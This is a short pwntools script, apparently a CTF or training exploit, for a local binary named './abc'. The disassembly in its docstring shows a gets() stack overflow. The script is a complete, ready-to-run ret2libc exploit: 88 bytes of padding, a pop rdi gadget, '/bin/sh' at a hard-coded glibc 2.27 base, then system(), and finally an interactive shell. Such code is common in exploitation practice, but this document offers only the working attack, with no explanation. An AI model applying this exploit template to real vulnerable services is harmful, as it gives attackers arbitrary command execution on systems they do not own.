from pwn import *
"""
   0x0000000000400537 <+0>:     push   rbp
   0x0000000000400538 <+1>:     mov    rbp,rsp
   0x000000000040053b <+4>:     sub    rsp,0x50
   0x000000000040053f <+8>:     lea    rdi,[rip+0xae]        # 0x4005f4
   0x0000000000400546 <+15>:    call   0x400430 <puts@plt>
   0x000000000040054b <+20>:    lea    rax,[rbp-0x50]
   0x000000000040054f <+24>:    mov    rdi,rax
   0x0000000000400552 <+27>:    mov    eax,0x0
   0x0000000000400557 <+32>:    call   0x400440 <gets@plt>
   0x000000000040055c <+37>:    mov    eax,0x0
   0x0000000000400561 <+42>:    leave
   0x0000000000400562 <+43>:    ret
"""

p = process('./abc')
elf = ELF('./abc')
context.binary = elf
libc = ELF('./libc.so.6')
pop_rdi = p64(0x00000000004005d3)
# for libc libc6_2.27-3ubuntu1.4_amd64
libc.address = 0x7ffff79e2000 
system = libc.symbols['system']
binsh = next(libc.search('/bin/sh'))
print (system, binsh)
ret = p64(0x0000000000400562) 

raw_input("Checkpoint!")
pay = "A" * 88 + pop_rdi + p64(binsh) + ret + p64(system)
p.sendline(pay)
p.interactive()
